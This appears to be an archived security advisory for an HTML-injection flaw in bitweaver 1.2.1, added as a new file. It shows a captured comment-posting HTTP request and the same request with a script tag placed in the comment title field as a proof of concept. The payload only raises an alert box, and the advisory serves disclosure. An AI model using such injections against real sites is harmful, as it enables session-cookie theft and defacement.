@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/16973/info
+
+The bitweaver application is prone to an HTML-injection vulnerability. The application fails to properly sanitize user-supplied input before using it in dynamically generated content. 
+
+Attacker-supplied HTML and script code would be executed in the context of the affected website, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+This issue is reported to affect version 1.2.1; other versions may also be vulnerable.
+
+http://www.exapmle.com/[patch]/read.php?article_id=7#editcomments
+POST /articles/read.php?article_id=7 HTTP/1.1
+Host: http://www.exapmle.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT; rv:1.7.12) Gecko/20050919 Firefox/1.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: it,it-it;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://www.exapmle.com/articles/read.php?article_id=7
+Cookie: mod_usertrack=82.56.164.250.1141558144377994; BWSESSION=v5a6krvki42h0puv48dc5coki0; tz_offset=3600; tiki-user-bitweaver=616706c4d6f7bdf68b30893f860cbb2b
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 265
+tk=c67481b438f7be3da147&comments_maxComments=10&comments_style=threaded&comments_sort_mode=commentDate_desc&post_comment_reply_id=&post_comment_id=&comment_title=hacking&comment_data=[your_name_logged]&post_comment_submit=Post
+
+but we can modify the request POST in this way:
+
+tk=c67481b438f7be3da147&comments_maxComments=10&comments_style=threaded&comments_sort_mode=commentDate_desc&post_comment_reply_id=&post_comment_id=&comment_title=%3Cscript%3Ealert%28%22lol%22%29%3B%3C%2Fscript%3E&comment_data=[your_name_logged]&post_comment_submit=Post
